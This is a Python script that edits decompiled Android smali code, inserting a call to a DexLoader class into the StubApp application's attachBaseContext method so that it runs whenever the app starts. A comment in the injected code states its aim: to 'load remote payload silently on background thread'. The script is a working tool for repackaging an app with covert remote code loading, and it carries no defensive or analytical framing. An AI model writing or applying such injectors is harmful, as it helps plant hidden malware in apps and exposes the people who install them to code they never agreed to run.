#!/usr/bin/env python3
"""Inject DexLoader.load() into StubApp.attachBaseContext smali"""
import re, sys, os

def find_stubapp(base="build/decompiled"):
    for root, dirs, files in os.walk(base):
        if "StubApp.smali" in files:
            return os.path.join(root, "StubApp.smali")
    return None

def main():
    path = sys.argv[1] if len(sys.argv) > 1 else find_stubapp()
    if not path or not os.path.exists(path):
        print(f"ERROR: StubApp.smali not found (tried: {path})")
        sys.exit(1)

    print(f"Processing: {path}")
    with open(path, "r") as f:
        content = f.read()

    if "DexLoader" in content:
        print("✅ DexLoader already present, skipping")
        return

    inject = (
        "\n"
        "    # DDL: load remote payload silently on background thread\n"
        "    invoke-static {p1}, Lcom/ddl/DexLoader;->load(Landroid/content/Context;)V\n"
    )

    # Pattern: invoke-super {p0, p1}, Landroid/app/Application;->attachBaseContext(...)V
    pattern = r"(invoke-super \{p0, p1\}, Landroid/app/Application;->attachBaseContext\(Landroid/content/Context;\)V)"
    new_content = re.sub(pattern, r"\1" + inject, content, count=1)

    if new_content == content:
        print("WARNING: primary pattern not found, trying fallback")
        pattern2 = r"(invoke-super \{[^}]+\},\s*Landroid/app/Application;->attachBaseContext[^\n]+)"
        new_content = re.sub(pattern2, r"\1" + inject, content, count=1)

    if "DexLoader" not in new_content:
        print("ERROR: injection failed — pattern not matched in smali")
        print("=== attachBaseContext context ===")
        for i, line in enumerate(content.splitlines()):
            if "attachBaseContext" in line or "invoke-super" in line:
                print(f"  {i}: {line}")
        sys.exit(1)

    with open(path, "w") as f:
        f.write(new_content)

    print("✅ DexLoader injected successfully")
    count = sum(1 for line in new_content.splitlines() if "DexLoader" in line)
    print(f"   DexLoader references: {count}")

if __name__ == "__main__":
    main()
